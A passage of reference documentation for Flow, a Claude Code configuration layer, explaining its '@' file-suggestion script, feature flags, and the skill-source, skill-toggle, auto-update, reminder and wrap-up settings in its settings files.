The minimum is 1, and `0` fails validation. A settings file that cannot be parsed pauses the sweep entirely, and `/status` carries the warning until it is fixed.

---

### `fileSuggestion`

```json
"fileSuggestion": { "type": "command", "command": "node \"$HOME/.flow/scripts/file-suggestion.js\"" }
```

Typing `@` opens a list of up to 15 file paths to pick from. Claude Code builds that list itself unless this key names a script. Flow's script, `scripts/file-suggestion.js`, builds it instead.

**Flow replaces the list for 2 things Claude Code's own cannot do:**

- **It offers git-ignored files.** Claude Code's list leaves them out, so `.env`, `tmp/` or a local notes file could only be named by typing the whole path. The script walks the project itself and never reads `.gitignore`.
- **It puts the most recently changed file first.** A bare `@` shows the 15 files you touched last, which is usually the one you are about to name.

A path shows when every word you typed appears in it, ignoring case. `comp butt` finds `src/components/Button.tsx`, and `btn` does not, where Claude Code's own looser matching would.

**It never enters** `.git`, `node_modules`, `dist`, `build`, `out`, `coverage`, `.next`, `target`, `.venv` or `__pycache__`. [`fileSuggestionIgnore`](#filesuggestionignore) adds your own.

**It runs on every keystroke after `@`, so it answers from a saved walk.** Walking 30,000 files takes 200 to 400 ms, too slow to wait for on every letter. So the walk runs once and saves every path with its change time, in one file per project under the system's temp folder. A keystroke reads that file: about 60 ms on 30,000 files, 34 of them Node starting.

- **A saved walk older than 2 seconds is still used.** The keystroke answers from it, and a walk runs in the background for the next keystroke. A file created a moment ago is missing for one keystroke at most.
- **Where 200 paths or fewer match, their change times are read fresh**, so the file you saved a second ago tops the list without waiting for a walk.
- **The very first `@` in a project waits 250 ms at most.** With nothing saved yet, the walk stops there, and the next keystroke finishes it in the background.
- **The walk stops at 50,000 files**, nearest the root first, so a huge folder never slows the list. A file deeper than that is reached by typing its whole path.

The script replaces the file paths alone. Everything else `@` offers, subagent names among it, still shows.

Claude Code can skip the script without a warning and use its own list: in a folder you have not trusted, or where managed settings turn hooks off.

---

### Feature flags

| Key | Value | Effect |
|---|---|---|
| `disableBundledSkills` | `true` | Anthropic's bundled skills stay out, so only Flow's skills load. |
| `disableWorkflows` | `true` | Built-in workflows off: Flow's skills are the workflow. |
| `disableRemoteControl` | `true` | No driving the session from claude.ai or mobile. |
| `disableClaudeAiConnectors` | `true` | No claude.ai connectors. |
| `disableArtifact` | `true` | No artifact tool. `/flow:visualize` renders inline. |
| `autoMemoryEnabled` | `false` | Auto memory is retired. It is per-repository and machine-local, so it cannot hold anything durable. Everything worth keeping goes in the repo: `AGENTS.md`, `docs/`, or a skill. |
| `respondToBashCommands` | `false` | A command you type behind `!` in the input box puts its output in context and stops there, instead of spending a turn reacting to it. `! flow sync` and `! ls` should cost nothing. When you want a reaction, the next message asks for one, and it carries your instructions, which an automatic reply cannot. |

---

### Deliberately absent

**The built-in task tools** (`TaskCreate`, `TaskGet`, `TaskList`, `TaskUpdate`) stay allowed rather than joining the deny list. They look like a tracker competing with `flow` and are not: `flow` records work that outlives the session, these are a scratch checklist for the turn in front of you. Denying them costs the checklist and saves nothing.

**`sandbox`.** Claude Code's wall around shell commands was considered and rejected. [Why every shell command is allowed](#why-every-shell-command-is-allowed) gives the reasons. It remains the right answer for an unattended run.

## Flow's settings files

`~/.flow/settings.json` and `~/.flow/settings.local.json` hold what Flow reads and Claude Code never does. Every key sits at the top level, and Flow reads the 2 files as one with the local file winning:

```json
{
  "sources": ["Adrian333Dev/domain-skills", "mattpocock/skills"],
  "skills": { "review": "on" }
}
```

**Which file a key goes in is decided by one question: would the value still be true on your other machines?** `~/.flow/` is one git repository shared between your machines, so `settings.json` travels and `settings.local.json` is the part git ignores.

A project has one file of its own, `.flow/settings.json`. It holds the project's [`skills`](#skills) lines and is committed, so a fresh clone of the project gets its skills back.

A change applies on the next command, with nothing to restart.

---

### `sources`

The skill repositories Flow takes skills from. A skill repository is a git repository of skill folders: every `SKILL.md` in it is a skill. `flow skills add` and `flow skills drop` write this key, in the shared file:

```json
"sources": ["Adrian333Dev/domain-skills", "mattpocock/skills"]
```

Each entry is `owner/repo` for GitHub, or a full git address for anywhere else. With no `sources` key the list is the [`domain-skills`](https://github.com/Adrian333Dev/domain-skills) repository alone, which holds skills about one field or tool, such as React.

**`flow install` clones every entry that is missing**, into `~/.flow/repos/sources/<owner>_<repo>/`, and nothing else clones. A machine joining your Flow home gets the list as `flow install` downloads it, and clones every entry there and then. A machine already on it gets a new entry through [`flow sync`](reference.md#flow-sync), and its next `flow install` makes the clone. [`flow skills`](reference.md#flow-skills) covers the commands.

---

### `skills`

Which skills are switched on or off, one line per skill name that differs from its default:

```json
"skills": { "react": "on", "review": "on" }
```

**3 files hold this key, and the nearest one wins, name by name.**

- **One project**: `<project>/.flow/settings.json`, committed with the project
- **This machine**: `~/.flow/settings.local.json`
- **Every machine**: `~/.flow/settings.json`

A name no file mentions is off. So the files hold only what you switched. Flow's own skills outside `skills/dev/` are the exception. They are the workflow, always on, and a line naming one does nothing. Only `/flow:review` and `/flow:apply-domain-findings` switch.

**`flow skills on` and `off` write the lines, and you never have to.** No flag writes the project's file, `--machine` this machine's, and `--global` the shared one. A line you write by hand works too, from the next command or the next session.

**A line works by making a link.** A skill on for a project is a link in that project's `.claude/skills/`. One on for the machine is a link in `~/.claude/skills/`. Every `flow skills` command and every session start add and remove links until they match the lines. [`flow skills`](reference.md#flow-skills) shows the listing, and what each command refuses.

---

### `skillsAutoUpdate`

Whether every skill repository in [`sources`](#sources) updates itself. Write `false` to be asked instead:

```json
"skillsAutoUpdate": false
```

**On, which is the default, a session opens and each clone pulls itself in the background.** Every skill reaches a project as a link into its clone, so a merge in the repository reaches every project holding the skill the moment the pull lands. Nothing else has to run: Flow being behind means a migration, and a skill being behind means a pull.

**Two guards, both read before anything is pulled.** Uncommitted work in the clone, and a pull that would not be a fast-forward. Either one means no pull for that clone, and a line at the top of the next session saying which:

```text
Flow: domain-skills has 2 uncommitted files, so none of its skills was updated. Commit them, or update the clone by hand.
```

Without the guards, a pull nobody asked for could wreck work sitting in that clone.

**Off, each session fetches instead and names what is waiting**, every session until you pull. The names are the news: `react changed` is something to read, where `3 commits` is not.

**It costs one network call per clone every 6 hours at most.** A clone's last fetch is what the check reads, so a machine that opens 20 sessions in a morning looks once. A clone with something to report is checked every session instead, which is how the line stops the moment you have pulled by hand.

Every pull that changed something adds a line to the history log, `~/.flow/logs/history/<month>.jsonl`, naming the skills it changed. A pull or fetch git refused also adds one to the failure log beside it.

`"sessionCheck": false` silences the line and not the pull, since the skills are what an agent reads in a project. This key is the one that stops it.

---

### `reminder`

Whether the line pointing at the reply rules prints beside every message you send. Write `false` to silence it:

```json
"reminder": false
```

**Every line Flow prints on its own carries a key like this one**, read by the script that prints it. A line is on unless its key says `false`, so a machine with no settings file at all gets all of them. `scripts/reminder.js` reads this one.

[The reminder](#the-reminder) shows the line and says why it exists.

---

### `sessionCheck`

Whether the line naming what needs attention prints when a session opens. Write `false` to silence it:

```json
"sessionCheck": false
```

[The session check](#the-session-check) shows every line it can print and says which files it reads.

It silences the printing alone, the setup line and the memory line included. The background fetch of your Flow home still runs. Every skill repository still updates itself, which [`skillsAutoUpdate`](#skillsautoupdate) governs.

---

### `setupReminder`

Whether a session opened in a git repository with no `.flow/` suggests `flow setup project`, and whether one opened in a project set up on another machine suggests folding in this machine's old memory. Write `false` to turn both off everywhere:

```json
"setupReminder": false
```

[The session check](#the-session-check) shows both lines and says where each shows.

---

### `setupReminderSkip`

Folders the setup line and the memory line never show in, each with everything below it:

```json
"setupReminderSkip": ["~/code/playground", "~/notes"]
```

**Put it in `~/.flow/settings.local.json`.** It holds paths, and your other machines may keep their folders somewhere else. `~` stands for the home folder, and any other entry is a full path.

`flow settings off setupReminder`, typed inside a repository, adds that repository's top folder to the list, and `on` takes it out.

---

### `wrapUp`

Whether the agent is told to hand off once the conversation passes [`wrapUpAt`](#wrapupat) tokens. Write `false` to silence it:

```json
"wrapUp": false
```

[The wrap-up](#the-wrap-up) shows both lines and says when each prints.

---

### `wrapUpAt`

The conversation size, in tokens, at which the agent is told to hand off. Unset, it is 150,000:

```json
"wrapUpAt": 140000
```

Either machine file holds it, and the local one wins, so a machine can keep a limit of its own.

---

### `fileSuggestionIgnore`

Folders and files the `@` list never offers, beyond the fixed ones [`fileSuggestion`](#filesuggestion) names:

```json
"fileSuggestionIgnore": ["tmp", "lab/research"]
```

**An entry with no `/` is a name**, skipped at any depth: `tmp` skips `tmp/` and `docs/tmp/`. **An entry with a `/` is a path** from the project root: `lab/research` skips that folder and no other `research`. A `/` at the end changes nothing.

**3 files can hold it, and their lists add up**: the project's `.flow/settings.json`, `~/.flow/settings.local.json` and `~/.flow/settings.json`. Unlike [`skills`](#skills), no level replaces another, since a nearer file never needs to bring back a path a farther one hid.

A change shows once the next walk has run, a few seconds at most.
